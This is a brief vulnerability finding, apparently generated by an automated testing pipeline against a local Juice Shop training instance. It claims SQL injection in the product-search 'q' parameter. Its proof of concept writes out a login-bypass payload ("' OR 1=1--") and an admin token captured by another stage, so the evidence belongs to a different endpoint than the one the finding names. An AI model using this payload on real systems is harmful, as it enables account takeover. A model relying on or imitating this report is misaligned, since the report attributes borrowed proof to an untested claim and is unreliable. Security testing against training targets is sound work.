title: SQL Injection in Product Search
description: The product search endpoint at /rest/products/search is vulnerable to SQL injection in the 'q' parameter. Injecting a single quote causes a SQLite error (SQLITE_ERROR: incomplete input), confirming SQL injection with a SQLite backend. While UNION extraction is possible, the error alone proves injection.
poc: Probe request against GET http://127.0.0.1:3010/rest/products/search?q=; observed proving result from prior stage handoff: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
